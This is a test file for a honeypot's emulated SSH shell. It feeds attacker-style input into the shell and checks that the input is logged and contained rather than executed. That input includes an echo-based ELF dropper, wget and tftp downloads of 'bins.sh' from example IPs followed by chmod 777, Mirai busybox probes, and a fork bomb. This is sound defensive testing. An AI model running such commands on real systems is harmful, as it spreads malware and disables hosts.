from __future__ import annotations

import pytest

from honeynet.shell.session import ShellSession
from conftest import FakeCtx


def make(persona="debian"):
    ctx = FakeCtx()
    events = []
    sh = ShellSession(persona_name=persona, user="root", emit=lambda ev, **d: events.append((ev, d)), ctx=ctx,
                      src_ip="198.51.100.7", session_id="sess1", service="ssh")
    return sh, ctx, events


async def run(sh, line, final=True):
    r = await sh.feed(line, final=final)
    return r.output.decode("utf-8", "replace")


async def test_basic_commands_and_pipes():
    sh, _, _ = make()
    assert "x86_64" in await run(sh, "uname -m")
    assert (await run(sh, "cat /proc/cpuinfo | grep name | wc -l")).strip() == "2"
    assert (await run(sh, "echo a; echo b && echo c || echo d")).split() == ["a", "b", "c"]
    assert (await run(sh, "x=5; echo $x ${x}0 $(echo sub)")).strip() == "5 50 sub"
    assert (await run(sh, "false || echo fallback")).strip() == "fallback"


async def test_filesystem_writes_and_echo_binary_dropper():
    sh, ctx, events = make()
    await run(sh, r"cd /tmp; echo -ne '\x7f\x45\x4c\x46\x01\x01\x01\x00' > .x; echo -ne '\x00\x00AAAAAAAA' >> .x")
    await run(sh, "chmod +x .x")
    assert len(ctx.captures) == 1
    data, src = ctx.captures[0]
    assert data.startswith(b"\x7fELF") and len(data) == 18
    assert src["via"] == "chmod+x" and src["src_ip"] == "198.51.100.7"
    assert any(e == "file.captured" for e, _ in events)
    # executing a binary never does anything but is logged
    out = await run(sh, "./.x")
    assert out == ""
    assert any(e == "file.exec_attempt" for e, _ in events)


async def test_heredoc_and_script_execution():
    sh, _, _ = make()
    r = await sh.feed("cat > /tmp/s.sh <<EOF")
    assert r.prompt_kind == "ps2"
    await sh.feed("echo hi $HOME")
    r = await sh.feed("EOF")
    assert r.prompt_kind == "ps1"
    assert (await run(sh, "sh /tmp/s.sh")).strip() == "hi /root"


async def test_control_flow_and_loops():
    sh, _, _ = make()
    out = await run(sh, "for a in x y z; do echo $a; done")
    assert out.split() == ["x", "y", "z"]
    out = await run(sh, "if [ -f /etc/passwd ]; then echo yes; else echo no; fi")
    assert out.strip() == "yes"
    out = await run(sh, 'case foo in f*) echo matched;; *) echo no;; esac')
    assert out.strip() == "matched"


async def test_download_is_simulated_and_logged_without_network():
    sh, ctx, events = make()
    out = await run(sh, "cd /tmp; wget http://203.0.113.5/bins.sh; chmod 777 bins.sh; ls")
    assert "bins.sh" in out and "saved" in out
    dl = [d for e, d in events if e == "download.attempt"]
    assert dl and dl[0]["url"] == "http://203.0.113.5/bins.sh" and dl[0]["fetched"] is False
    assert (await run(sh, "tftp -g -l t.bin -r t.bin 203.0.113.9; ls")).split()[-1] == "t.bin"
    urls = [d["url"] for e, d in events if e == "download.attempt"]
    assert "tftp://203.0.113.9/t.bin" in urls


async def test_mirai_style_probes():
    sh, _, _ = make("iot")
    assert "MIRAI: applet not found" in await run(sh, "/bin/busybox MIRAI")
    assert "not found" in await run(sh, "enable")
    out = await run(sh, "cat /proc/mounts")
    assert "/proc" in out


async def test_hostile_input_is_contained():
    sh, _, _ = make()
    # infinite loop, huge recursion and fork-bomb-ish text must terminate quickly
    await run(sh, "while true; do echo x; done")
    await run(sh, ":(){ :|:& };:")
    await run(sh, "$(" * 50 + ")" * 50)
    assert (await run(sh, "echo still-alive")).strip() == "still-alive"
    assert (await run(sh, "echo 'unterminated")).startswith("sh: syntax error")


async def test_capture_all_at_session_end():
    sh, ctx, _ = make()
    await run(sh, "echo '#!/bin/sh' > /tmp/a.sh; echo 'wget http://203.0.113.5/x' >> /tmp/a.sh")
    assert sh.capture_all() == 1
    assert ctx.captures[0][0].startswith(b"#!/bin/sh")
